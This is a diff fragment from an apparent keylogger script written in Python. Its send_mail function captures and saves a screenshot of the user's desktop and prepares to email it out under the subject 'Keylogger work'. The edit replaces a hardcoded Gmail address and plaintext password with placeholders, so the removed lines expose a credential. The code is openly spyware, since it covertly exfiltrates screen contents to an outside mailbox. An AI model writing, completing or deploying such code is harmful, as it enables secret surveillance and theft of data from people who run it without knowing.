@@ -147,9 +147,10 @@ def filter(ke, cap):
 def send_mail():
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save(r'C:\Users\ADMIN\Desktop\screenshot_1.png')
-    Sender_Email = "kelogtest@gmail.com"
-    Reciever_Email = "kelogtest@gmail.com"
-    Password = ('123qweAa')
+    # enter your email and the password of it.
+    Sender_Email = "your email"
+    Reciever_Email = "your email"
+    Password = ('your password')
 
     newMessage = EmailMessage()
     newMessage['Subject'] = "Keylogger work"
